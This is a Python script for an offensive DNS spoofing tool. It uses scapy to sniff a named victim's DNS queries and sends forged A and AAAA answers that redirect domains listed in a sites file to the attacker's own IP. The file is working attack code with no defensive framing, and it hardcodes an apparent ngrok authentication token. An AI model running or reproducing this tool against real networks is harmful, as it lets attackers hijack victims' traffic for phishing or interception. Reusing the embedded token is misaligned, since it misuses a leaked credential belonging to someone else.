import json
import socket

import tldextract
from scapy.all import *
from pyngrok import ngrok
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import UDP, IP
from scapy.layers.l2 import Ether

JSON_SITES = "sites.json"
registers = {}

ngrok_tunnel = None


def activate_ngrok():
    ngrok.set_auth_token("27PuLsc7PgLTe4b4n9bK9bQfj7I_6cyk1zbs1Cee66tbGSuTL")

    tunnels = ngrok.get_tunnels()
    for i in tunnels:
        ngrok.disconnect(i.public_url)

    global ngrok_tunnel
    ngrok_tunnel = ngrok.connect(inspect=False)

    print(f'NGROK URL: {ngrok_tunnel.public_url}')
    return ngrok_tunnel.public_url


# SPOOF_DOMAIN = 'facebook.com'


# Dictionary with console color codes to print text


def menu():
    print("\t--------------------------------------")


# Gets the local IP address to avoid self spoofing
def setup_local_ip(address):
    """
       Gets the local IP address to avoid self-spoofing.
       :param address: The address to obtain the IP for.
       :return: A tuple containing the IPv4 and IPv6 addresses.
       """
    # local_ip =   # socket.gethostname()
    """while True:
        if valid_ip(local_ip):
            break
        else:
            local_ip = input("\t[!] Cannot get your local IP address, please write it: ").strip()"""
    return socket.gethostbyname_ex(address)[-1][-1], \
           socket.getaddrinfo(address, None, socket.AF_INET6)[-1][4][0]  # [-1][4][0]


local_ip = setup_local_ip(socket.gethostname())  # activate_ngrok().split('/')[-1]


# Validates args format
def valid_args():

    all_pkt = False
    if not valid_ip(victim_ip):
        if victim_ip != 'all':
            print('\t[!] Invalid victim\'s IP address')
            sys.exit(1)
        else:
            all_pkt = True
    return all_pkt


def get_ips(sites_at: list):
    v4 = ''
    v6 = ''

    for i in sites_at:
        if ':' in i:
            v6 = i
        else:
            v4 = i

        if len(v4) > 0 and len(v6) > 0:
            break

    # print(v4, v6)

    return v4, v6


# Loads the records file and save it into a Dictionary
def read_file():
    with open(JSON_SITES, 'r') as f:
        sites = json.loads(f.read())

    for i in sites.keys():
        # print(local_ip, socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET6)[0][4][0])
        registers[i] = local_ip  #
        # get_ips(sites[SPOOF_DOMAIN])  # ('127.0.0.1', '::1')
        print(f'{i}: {registers[i]}')


# Checks if is a valid DNS query and sends a spoofed response
def fake_dns_response(pkt):
    """
    Checks if the given packet is a valid DNS query and sends a spoofed response.
    :param pkt: The packet to check.
    """
    # print(tldextract.extract(pkt[DNSQR].qname.decode()))
    if DNS in pkt:
        reg_domain = tldextract.extract(pkt[DNSQR].qname.decode()).registered_domain  # sub.domain.com

        if pkt[IP].src == victim_ip and pkt[DNS].opcode == 0 and reg_domain in registers:
            # reg_domain = domain_extract.registered_domain
            # print(reg_domain)
            # pkt.show()
            '''DNSRR(rrname=pkt[DNSQR].qname,
                           ttl=300,
                           type=5,
                           rdata=SPOOF_DOMAIN) /'''

            if pkt[DNSQR].qtype == 1:
                fake_response = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src,
                                                                                   src=pkt[IP].dst) / UDP(
                    dport=pkt[UDP].sport, sport=53) / DNS(id=pkt[DNS].id,
                                                          qd=pkt[DNS].qd,
                                                          aa=1, qr=1,
                                                          ancount=1,
                                                          an=DNSRR(rrname=pkt[DNSQR].qname,
                                                                   ttl=3600,
                                                                   rdata=registers[reg_domain][
                                                                       0]))

            elif len(registers[reg_domain][1]) > 0 and pkt[DNSQR].qtype == 28:  # len(registers[reg_domain][1]) > 0 and
                fake_response = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src,
                                                                                   src=pkt[IP].dst) / UDP(
                    dport=pkt[UDP].sport, sport=53) / DNS(id=pkt[DNS].id,
                                                          qd=pkt[DNS].qd,
                                                          aa=1, qr=1,
                                                          ancount=1,
                                                          an=DNSRR(rrname=pkt[DNSQR].qname,
                                                                   ttl=3600,
                                                                   type=28,
                                                                   rdata=registers[reg_domain][1]))
                # fake_response.show()

            # fake_response.show()
            #try:
            sendp(fake_response, verbose=0)
            sendp(fake_response, verbose=0)
            #except UnboundLocalError as e:
            #    pass

            print(
                f"\t[#] Spoofed response sent to [{pkt[IP].src}]: Redirecting [{reg_domain}] to [{' '.join(registers[reg_domain])}]")


def dns_spoof_main(victim):
    global victim_ip
    victim_ip = victim
    global all_pkt
    all_pkt = valid_args()

    sniff_filter = f'(udp port 53 or tcp port 53) and host {victim_ip}'

    menu()
    read_file()
    print('\t[i] Spoofing DNS responses...')
    # print(sniff_filter)
    sniff(prn=fake_dns_response, filter=sniff_filter, store=0)


if __name__ == "__main__":
    # Checks args length
    if len(sys.argv) != 2:
        print('    [i] Usage <victim_ip>')
        sys.exit(1)
    else:
        victim_ip = sys.argv[1]
        # path = sys.argv[2]
    #main(victim_ip)
    dns_spoof_main(victim_ip)
